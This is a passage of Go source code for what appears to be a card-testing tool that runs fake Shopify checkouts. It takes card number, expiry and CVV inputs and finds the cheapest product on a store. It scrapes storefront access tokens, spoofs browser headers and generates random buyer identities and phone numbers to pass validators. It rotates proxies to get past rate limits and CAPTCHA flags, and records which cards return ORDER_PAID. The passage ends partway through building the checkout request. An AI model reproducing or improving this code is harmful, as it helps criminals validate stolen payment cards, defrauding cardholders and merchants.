const VARIANT_FETCH_QUERY = `query{products(first:50){edges{node{variants(first:50){edges{node{id availableForSale requiresShipping price{amount currencyCode}}}}}}}}`

func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (string, float64, string, bool, error) {
	// Bound the whole variant hunt: sequential version attempts + homepage scrape
	// must never burn the 90s request budget (was hitting 90.00s wall).
	var cancel context.CancelFunc
	ctx, cancel = context.WithTimeout(ctx, 15*time.Second)
	defer cancel()
	reVid := regexp.MustCompile(`ProductVariant/(\d+)`)
	tokenRe := regexp.MustCompile(`(?i)(?:storefrontAccessToken|accessToken)["']?\s*[:=]\s*["']([a-f0-9]{32})`)

	type gqlVariant struct {
		ID               string `json:"id"`
		AvailableForSale bool   `json:"availableForSale"`
		RequiresShipping bool   `json:"requiresShipping"`
		Price            struct {
			Amount       string `json:"amount"`
			CurrencyCode string `json:"currencyCode"`
		} `json:"price"`
	}
	type gqlResp struct {
		Data *struct {
			Products *struct {
				Edges []struct {
					Node *struct {
						Variants *struct {
							Edges []struct {
								Node *gqlVariant `json:"node"`
							} `json:"edges"`
						} `json:"variants"`
					} `json:"node"`
				} `json:"edges"`
			} `json:"products"`
		} `json:"data"`
	}

	fetch := func(token string) []byte {
		for _, ver := range []string{"2025-01", "2024-10", "2024-07", "2024-01"} {
			gqlURL := fmt.Sprintf("%s/api/%s/graphql.json", baseURL, ver)
			payload, _ := json.Marshal(map[string]interface{}{"query": VARIANT_FETCH_QUERY})
			req, err := http.NewRequestWithContext(ctx, "POST", gqlURL, bytes.NewReader(payload))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
			if token != "" {
				req.Header.Set("X-Shopify-Storefront-Access-Token", token)
			}
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			if resp.StatusCode != 200 {
				if resp.StatusCode != 404 {
					return body
				}
				continue
			}
			var probe gqlResp
			if json.Unmarshal(body, &probe) == nil && probe.Data != nil && probe.Data.Products != nil {
				return body
			}
		}
		return nil
	}

	pick := func(data []byte) (string, float64, string, bool, bool) {
		var r gqlResp
		if err := json.Unmarshal(data, &r); err != nil || r.Data == nil || r.Data.Products == nil {
			return "", 0, "", false, false
		}
		type candidate struct {
			id       string
			price    float64
			currency string
			band     int
			shipping bool
		}
		var candidates []candidate
		for _, pe := range r.Data.Products.Edges {
			if pe.Node == nil || pe.Node.Variants == nil {
				continue
			}
			for _, ve := range pe.Node.Variants.Edges {
				v := ve.Node
				if v == nil || !v.AvailableForSale {
					continue
				}
				m := reVid.FindStringSubmatch(v.ID)
				if len(m) < 2 {
					continue
				}
				price, err := strconv.ParseFloat(strings.ReplaceAll(v.Price.Amount, ",", ""), 64)
				if err != nil || price <= 0 {
					continue
				}
				band := 4
				if price <= 1.0 {
					band = 1
				} else if price <= 5.0 {
					band = 2
				} else if price <= 10.0 {
					band = 3
				}
				candidates = append(candidates, candidate{id: m[1], price: price, currency: v.Price.CurrencyCode, band: band, shipping: v.RequiresShipping})
			}
		}
		if len(candidates) == 0 {
			return "", 0, "", false, false
		}
		best := candidates[0]
		for _, c := range candidates[1:] {
			if c.band < best.band ||
				(c.band == best.band && c.shipping && !best.shipping) ||
				(c.band == best.band && c.shipping == best.shipping && c.price < best.price) {
				best = c
			}
		}
		return best.id, best.price, best.currency, best.shipping, true
	}

	if body := fetch(""); body != nil {
		if id, price, cur, shipping, ok := pick(body); ok {
			return id, price, cur, shipping, nil
		}
	}

	// Fallback: extract storefront token from homepage (via token cache) and retry
	homeToken := ""
	if cached, ok := cacheLookupToken(baseURL); ok {
		homeToken = cached
	} else if req, err := http.NewRequestWithContext(ctx, "GET", baseURL, nil); err == nil {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
		if resp, err := client.Do(req); err == nil {
			if b, err := io.ReadAll(resp.Body); err == nil {
				if m := tokenRe.FindSubmatch(b); len(m) == 2 {
					homeToken = string(m[1])
					cacheStoreToken(baseURL, homeToken)
				}
			}
			resp.Body.Close()
		}
	}
	if homeToken != "" {
		if body := fetch(homeToken); body != nil {
			if id, price, cur, shipping, ok := pick(body); ok {
				return id, price, cur, shipping, nil
			}
		}
	}

	return "", 0, "", false, fmt.Errorf("no valid paid variant found")
}

// fetchVariantCached wraps fetchVariant with a 10-minute per-store cache.
// This is the biggest performance win: 1000 cards on the same store = 1 fetch.
func fetchVariantCached(ctx context.Context, client *http.Client, baseURL string) (string, float64, string, bool, error) {
	if id, price, cur, shipping, ok := cacheLookupVariant(baseURL); ok {
		atomic.AddInt64(&metrics.CacheHits, 1)
		log.Printf("[CACHE HIT] variant for %s", baseURL)
		return id, price, cur, shipping, nil
	}
	atomic.AddInt64(&metrics.CacheMisses, 1)
	if v, ok := variantMiss.Load(baseURL); ok {
		if ts, ok := v.(time.Time); ok && time.Now().Before(ts) {
			return "", 0, "", false, fmt.Errorf("no valid paid variant found (cached)")
		}
		variantMiss.Delete(baseURL)
	}
	id, price, cur, shipping, err := fetchVariant(ctx, client, baseURL)
	if err != nil {
		variantMiss.Store(baseURL, time.Now().Add(VARIANT_MISS_TTL))
		return "", 0, "", false, err
	}
	cacheStoreVariant(baseURL, id, price, cur, shipping)
	return id, price, cur, shipping, nil
}

// ==========================================
// GRAPHQL QUERIES (DO NOT CHANGE)
// ==========================================

const QUERY_PROPOSAL = `query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$checkpointData:String,$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:{lines:[],acceptUnexpectedDiscounts:true},payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,localizationExtension:$localizationExtension,nonNegotiableTerms:$nonNegotiableTerms,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties},checkpointData:$checkpointData,queueToken:$queueToken}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDetails on Proposal{runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{deliveryStrategyHandle signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}scriptFingerprint{signature signatureUuid __typename}transformerFingerprintV2 delivery{...on FilledDeliveryTerms{deliveryLines{targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}intermediateRates progressiveRatesEstimatedTimeUntilCompletion __typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName __typename}...on OffsiteProvider{paymentMethodIdentifier name __typename}...on CustomOnsiteProvider{paymentMethodIdentifier name __typename}...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier __typename}...on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{deliveryLines{destinationAddress{...on StreetAddress{handle __typename}...on Geolocation{__typename}...on PartialStreetAddress{__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId merchandise{...DeliveryLineMerchandiseFragment __typename}__typename}...on MerchandiseBundleLineComponent{stableId merchandise{...DeliveryLineMerchandiseFragment __typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId merchandise{...DeliveryLineMerchandiseFragment __typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title __typename}variantId title price{amount currencyCode __typename}}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id variantId title product{id __typename}requiresShipping __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id variantId title sku price{amount currencyCode __typename}product{id __typename}requiresShipping __typename}fragment LineAllocationDetails on LineAllocation{stableId __typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId __typename}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId __typename}`

const MUTATION_SUBMIT = `mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{deliveryStrategyHandle signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{__typename}__typename}__typename}__typename}fragment BuyerProposalDetails on Proposal{__typename}fragment ProposalDetails on Proposal{__typename}`

const QUERY_POLL = `query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{__typename}__typename}__typename}__typename}`

// ==========================================
// CORE CHECKOUT ENGINE
// ==========================================

type CheckoutResult struct {
	Success  bool    `json:"Status"`
	Message  string  `json:"Response"`
	Gateway  string  `json:"Gateway"`
	Price    float64 `json:"Price"`
	Currency string  `json:"Currency"`
	Proxy    string  `json:"Proxy"`
	Time     string  `json:"Time"`
	CC       string  `json:"cc"`
}

// sellerBlock returns sellerProposal subtree (avoids buyerProposal echo values).
func sellerBlock(body []byte) []byte {
	if sp := fastExtract(body, "sellerProposal"); sp != nil {
		return sp
	}
	return body
}

// extractSignedHandle safely walks body -> deliveryExpectations -> deliveryExpectations -> signedHandle.
// Returns "" if any level is missing.
func extractSignedHandle(body []byte) string {
	de := fastExtract(body, "deliveryExpectations")
	if de == nil {
		return ""
	}
	exps := fastExtract(de, "deliveryExpectations")
	if exps == nil {
		return ""
	}
	return fstr(exps, "signedHandle")
}

// updateMetricsAndDead is called from processCard's defer. It updates
// atomic counters and marks the store dead when appropriate.
func updateMetricsAndDead(msg, baseURL string) {
	switch msg {
	case "ORDER_PAID":
		atomic.AddInt64(&metrics.TotalSuccess, 1)
	case "RATE_LIMITED":
		atomic.AddInt64(&metrics.RateLimited, 1)
		atomic.AddInt64(&metrics.TotalFailed, 1)
		markDeadStore(baseURL, "RATE_LIMITED", 90*time.Second)
	case "CAPTCHA_REQUIRED":
		// No dead-mark: a challenged store is not a dead store, and marking it
		// poisons the pool for every subsequent check (bot-side proxy cooldown
		// already rests the flagged IP). Count only.
		atomic.AddInt64(&metrics.CaptchaBlocked, 1)
		atomic.AddInt64(&metrics.TotalFailed, 1)
	case "Site is password protected":
		atomic.AddInt64(&metrics.TotalFailed, 1)
		markDeadStore(baseURL, "PASSWORD_PROTECTED", 60*time.Minute)
	case "Throttled":
		atomic.AddInt64(&metrics.TotalFailed, 1)
		markDeadStore(baseURL, "THROTTLED", 60*time.Second)
	case "3DS_REQUIRED":
		atomic.AddInt64(&metrics.ThreeDSCount, 1)
		atomic.AddInt64(&metrics.TotalFailed, 1)
	case "STILL_PROCESSING":
		atomic.AddInt64(&metrics.StillProcessing, 1)
		atomic.AddInt64(&metrics.TotalFailed, 1)
	case "CheckpointDenied", "NegotiationResultFailed", "UNPARSEABLE_RESPONSE", "CHECKOUT_SESSION_FAILED", "POLL_TRANSPORT_ERROR":
		atomic.AddInt64(&metrics.TotalFailed, 1)
	default:
		atomic.AddInt64(&metrics.TotalFailed, 1)
	}
}

func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, proxyStr string) CheckoutResult {
	cardStart := time.Now()
	res := CheckoutResult{Currency: "USD", Proxy: "Not Used", Gateway: "UNKNOWN", CC: cc + "|" + mes + "|" + ano + "|" + cvv}

	baseURL := normalizeDomain(siteURL)

	atomic.AddInt64(&metrics.ActiveChecks, 1)
	atomic.AddInt64(&metrics.TotalChecks, 1)

	// CVV-length pre-validation: Amex (34/37) needs 4 digits, everything
	// else 3. Mismatches are deterministic per card (every site rejects
	// identically) — fail instantly instead of burning 15 sites × 60-90s.
	_ccd := ""
	for _, _r := range cc {
		if _r >= '0' && _r <= '9' {
			_ccd += string(_r)
		}
	}
	_cvv := ""
	for _, _r := range cvv {
		if _r >= '0' && _r <= '9' {
			_cvv += string(_r)
		}
	}
	_isAmex := strings.HasPrefix(_ccd, "34") || strings.HasPrefix(_ccd, "37")
	if (_isAmex && len(_cvv) != 4) || (!_isAmex && len(_cvv) != 3) {
		res.Message = "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE"
		res.Time = fmt.Sprintf("%.2fs", time.Since(cardStart).Seconds())
		return res
	}
	defer func() {
		atomic.AddInt64(&metrics.ActiveChecks, -1)
		if res.Time == "" {
			res.Time = fmt.Sprintf("%.2fs", time.Since(cardStart).Seconds())
		}
		updateMetricsAndDead(res.Message, baseURL)
		incErrorCode(res.Message)
	}()

	// Dead store fast-path
	if dead, reason := isDeadStore(baseURL); dead {
		res.Message = "DEAD_STORE:" + reason
		res.Proxy = "Dead"
		return res
	}

	admitStart()

	client, err := getProxyClient(proxyStr)
	if err != nil {
		res.Message = "Invalid proxy format"
		res.Proxy = "Dead"
		return res
	}
	if proxyStr != "" {
		res.Proxy = "Live"
	}

	// ✅ AUTO-FETCH VARIANT IF NOT PROVIDED (with per-store cache)
	// Default to true so externally supplied variant IDs assume physical goods
	// (preserves legacy behavior when requiresShipping is unknown).
	requiresShipping := true
	if variantID == "" {
		vid, price, cur, shipping, err := fetchVariantCached(ctx, client, baseURL)
		if err != nil {
			res.Message = fmt.Sprintf("Auto-variant failed: %v", err)
			return res
		}
		variantID = vid
		res.Price = price
		res.Currency = cur
		requiresShipping = shipping
		log.Printf("[AUTO] Found variant %s ($%.2f %s, shipping=%v) for %s", vid, price, cur, shipping, baseURL)
	}

	// Address: prefer currency-based (accurate), fall back to URL-based.
	addr := pickAddrByURL(baseURL)
	if a, ok := pickAddrByCurrency(res.Currency); ok {
		addr = a
	}
	fName, lName := getRandName()
	email := genEmail(fName, lName)
	phone := normalizePhone(addr.Phone, addr.CountryCode)
	// Per-check randomized national number: static Book phones (55555555,
	// 9876543210, …) trip repeated/sequential-digit validators. Keep the
	// country dial code + digit count, randomize the rest (first digit 2-9).
	phoneE164, phoneLocal, phoneRaw := randomizedPhones(addr)
	// Dial + national length remembered so every PHONE remedy retries with
	// FRESH random digits (a bad draw like wrong leading digit must not
	// poison all format attempts).
	phoneDial, phoneNatLen := "", 0
	if _d, _ok := dialCodes[addr.CountryCode]; _ok {
		phoneDial = _d
		_bd := ""
		for _, _r := range addr.Phone {
			if _r >= '0' && _r <= '9' {
				_bd += string(_r)
			}
		}
		if strings.HasPrefix(_bd, _d) && len(_bd) > len(_d) {
			phoneNatLen = len(_bd) - len(_d)
		} else {
			phoneNatLen = len(_bd)
		}
	}
	regenPhones := func() {
		if phoneDial == "" || phoneNatLen <= 0 {
			return
		}
		if nl, ok := nationalLengths[addr.CountryCode]; ok && nl > 0 {
			phoneNatLen = nl
		}
		_gen := randNationalDigits(phoneNatLen, addr.CountryCode)
		phoneE164 = "+" + phoneDial + _gen
		phoneLocal = _gen
		phoneRaw = "+" + phoneDial + " " + _gen
	}
	if phoneE164 == "" {
		phoneE164 = phone
		phoneRaw = strings.TrimSpace(addr.Phone)
		_phoneDigits := ""
		for _, _r := range phoneE164 {
			if _r >= '0' && _r <= '9' {
				_phoneDigits += string(_r)
			}
		}
		phoneLocal = _phoneDigits
		if _d, _ok := dialCodes[addr.CountryCode]; _ok && strings.HasPrefix(_phoneDigits, _d) && len(_phoneDigits) > len(_d) {
			phoneLocal = _phoneDigits[len(_d):]
		}
	}
	// Alternate renderings (e164 → omit → local → raw) cycled by PHONE remedy.

	headers := map[string]string{
		"User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Accept":             "application/json, text/plain, */*",
		"Accept-Language":    "en-US,en;q=0.9",
		"Content-Type":       "application/json",
		"Origin":             baseURL,
		"Referer":            baseURL + "/",
		"sec-ch-ua":          `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
		"sec-ch-ua-mobile":   "?0",
		"sec-ch-ua-platform": `"Windows"`,
	}

	// Step 2: Cart Permalink → Checkout Session
	cartURL := fmt.Sprintf("%s/cart/%s:1", baseURL, variantID)
	cartHeaders := map[string]string{
		"User-Agent":     headers["User-Agent"],
		"Accept":         "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"sec-fetch-dest": "document",
		"sec-fetch-mode": "navigate",
		"sec-fetch-site": "same-origin",
		"sec-fetch-user": "?1",
	}

	var body []byte
	var status int
	var cartHdr http.Header
	// Cart fetch: every attempt bounded to 12s (never burn 45s on one slow store)
	{
		stageCtx, stageCancel := context.WithTimeout(ctx, 12*time.Second)
		body, status, cartHdr, err = doReqFull(stageCtx, client, "GET", cartURL, cartHeaders, nil)
		stageCancel()
	}
	// Cart retry: transient transport/rate-limit/5xx only (never 404) — 2 extra attempts, 12s stage budget
	shouldRetryCart := func() bool {
		if err != nil {
			return true
		}
		if status == 200 || status == 302 || status == 404 {
			return false
		}
		return status == 429 || status == 430 || status == 503 || status >= 500
	}
	for cartTry := 0; shouldRetryCart() && cartTry < 2; cartTry++ {
		time.Sleep(time.Duration(300+cartTry*200) * time.Millisecond)
		stageCtx, stageCancel := context.WithTimeout(ctx, 12*time.Second)
		body, status, cartHdr, err = doReqFull(stageCtx, client, "GET", cartURL, cartHeaders, nil)
		stageCancel()
	}
	if err != nil || (status != 200 && status != 302) {
		// Dead storefront (404/410): distinct verdict, but NEVER dead-mark —
		// a flagged egress IP also reads as 404, and marking poisons the whole
		// pool for an hour (every rotation then fast-fails). Audit purges these.
		if status == 404 || status == 410 {
			res.Message = "DEAD_STORE:NOT_FOUND"
			if proxyStr != "" {
				res.Proxy = "Dead"
			}
			return res
		}
		res.Message = "Cart permalink failed"
		atomic.AddInt64(&metrics.CartCreateFails, 1)
		if proxyStr != "" {
			res.Proxy = "Dead"
		}
		return res
	}

	text := string(body)
	paceStep()
	checkoutURL := baseURL + "/checkouts/cn/" + getRandStr(32)
	if loc := extractBetween(text, `<meta http-equiv="refresh" content="0;url=`, `"`); loc != "" {
		checkoutURL = loc
	}

	sst := cartHdr.Get("X-Checkout-One-Session-Token")
	if sst == "" {
		sst = extractBetween(text, `name="serialized-sessionToken" content="&quot;`, `&quot;`)
	}
	if sst == "" {
		sst = extractBetween(text, `"serializedSessionToken":"`, `"`)
	}
	queueToken := extractBetween(unescapeHTML(text), `"queueToken":"`, `"`)
	stableID := extractStableID(text, variantID)
	merch := extractBetween(text, `ProductVariantMerchandise/`, `&quot;`)
	if merch == "" {
		merch = extractBetween(unescapeHTML(text), `ProductVariantMerchandise/`, `"`)
	}
	if merch == "" {
		merch = variantID
	}
	currency := extractBetween(text, `currencyCode&quot;:&quot;`, `&quot;`)
	if currency == "" {
		currency = extractBetween(unescapeHTML(text), `"currencyCode":"`, `"`)
	}
	if currency == "" {
		currency = res.Currency
	}

	attemptToken := extractBetween(checkoutURL, `/checkouts/cn/`, `/`)
	if attemptToken == "" {
		attemptToken = extractBetween(checkoutURL, `/checkouts/c/`, `/`)
	}
	if attemptToken == "" {
		attemptToken = getRandStr(32)
	}

	buildID := ""
	reBuild := regexp.MustCompile(`"commitSha"\s*:\s*"([a-f0-9]{40})"`)
	if m := reBuild.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
		buildID = m[1]
	}
	if buildID == "" {
		reBuild2 := regexp.MustCompile(`checkoutWebBuildId":"([^"]+)"`)
		if m := reBuild2.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
			buildID = m[1]
		}
	}

	sourceToken := extractBetween(text, `name="serialized-sourceToken" content="`, `"`)
	if sourceToken == "" {
		reSrc := regexp.MustCompile(`checkoutWebSourceId":"([^"]+)"`)
		if m := reSrc.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
			sourceToken = m[1]
		}
	}

	pciURL := "https://checkout.pci.shopifyinc.com/sessions"
	rePCI := regexp.MustCompile(`checkoutCardsinkUrl":"([^"]+)"`)
	if m := rePCI.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
		pciURL = strings.TrimSuffix(m[1], "/") + "/sessions"
	}

	identSig := ""
	reIdent := regexp.MustCompile(`checkoutCardsinkCallerIdentificationSignature":"([^"]+)"`)
	if m := reIdent.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
		identSig = m[1]
	}

	if sst == "" {
		low := strings.ToLower(text)
		if strings.Contains(low, "password") && (strings.Contains(low, "enter") || strings.Contains(low, "store")) {
			res.Message = "Site is password protected"
			return res
		}
		if status == 429 || status == 430 || status == 503 {
			res.Message = "RATE_LIMITED"
			return res
		}
		res.Message = "CHECKOUT_SESSION_FAILED"
		return res
	}

	headers["shopify-checkout-client"] = "checkout-web/1.0"
	headers["shopify-checkout-source"] = fmt.Sprintf(`id="%s", type="cn"`, attemptToken)
	headers["x-checkout-one-session-token"] = sst
	headers["sec-fetch-dest"] = "empty"
	headers["sec-fetch-mode"] = "cors"
	headers["sec-fetch-site"] = "same-origin"
	if buildID != "" {
		headers["x-checkout-web-build-id"] = buildID
		headers["x-checkout-web-deploy-stage"] = "production"
	}
	if sourceToken != "" {
		headers["x-checkout-web-source-id"] = sourceToken
	}

	u, _ := url.Parse(checkoutURL)
	graphqlURL := fmt.Sprintf("https://%s/checkouts/unstable/graphql", u.Host)

	billingAddr := map[string]interface{}{
		"streetAddress": map[string]string{
			"address1": addr.Address1, "city": addr.City, "countryCode": addr.CountryCode,
			"postalCode": addr.PostalCode, "firstName": fName, "lastName": lName,
			"zoneCode": addr.ZoneCode, "phone": phoneE164,
			// DELIVERY_COMPANY_REQUIRED stores reject company-less
			// addresses; residential pattern (name as company) is neutral.
			"company": fName + " " + lName,
		},
	}

	// Delivery terms: SHIPPING for physical goods, noDeliveryRequired for digital.
	var deliveryVars map[string]interface{}
	if requiresShipping {
		deliveryVars = map[string]interface{}{
			"deliveryLines": []map[string]interface{}{{
				"destination": map[string]interface{}{
					"partialStreetAddress": billingAddr["streetAddress"],
				},
				"selectedDeliveryStrategy": map[string]interface{}{
					"deliveryStrategyMatchingConditions": map[string]interface{}{
						"estimatedTimeInTransit": map[string]interface{}{"any": true},
						"shipments":              map[string]interface{}{"any": true},
					},
					"options": map[string]interface{}{},
				},
				"targetMerchandiseLines": map[string]interface{}{"any": true},
				"deliveryMethodTypes":    []string{"SHIPPING"},
